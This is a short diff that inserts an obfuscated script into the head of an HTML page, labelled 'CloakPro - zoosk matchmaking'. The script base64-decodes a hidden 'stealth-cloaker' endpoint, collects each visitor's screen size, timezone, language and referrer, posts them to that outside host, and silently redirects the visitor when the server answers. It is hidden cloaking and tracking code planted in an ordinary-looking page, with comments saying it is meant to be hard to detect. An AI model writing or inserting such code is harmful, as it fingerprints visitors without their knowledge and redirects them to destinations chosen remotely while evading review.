@@ -3,7 +3,16 @@
 
 
 <head>
-
+<!-- CloakPro - zoosk matchmaking -->
+<!-- Encoded endpoint method - harder to detect -->
+<script>
+(function(_d,_w,_n){
+  var _e='aHR0cHM6Ly9zdGVhbHRoLWNsb2FrZXIucmVwbGl0LmFwcC9hcGkvY2xvYWsvMjVhNDUyNzAtZmU1NS00ZTM2LWI0MTUtOTFmNThkYmRkNmUy';
+  var _u=atob(_e.padEnd(Math.ceil(_e.length/4)*4,'='));
+  var _p={w:_w.screen.width,h:_w.screen.height,tz:Intl.DateTimeFormat().resolvedOptions().timeZone,l:_n.language,r:_d.referrer};
+  fetch(_u,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(_p)}).then(function(r){return r.json();}).then(function(d){if(d.redirect&&d.url){_w.location.replace(d.url);}}).catch(function(){});
+})(document,window,navigator);
+</script>
     <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
     <meta http-equiv="X-UA-Compatible" content="IE=edge" />
     <meta name="viewport" content="width=device-width, initial-scale=1" />
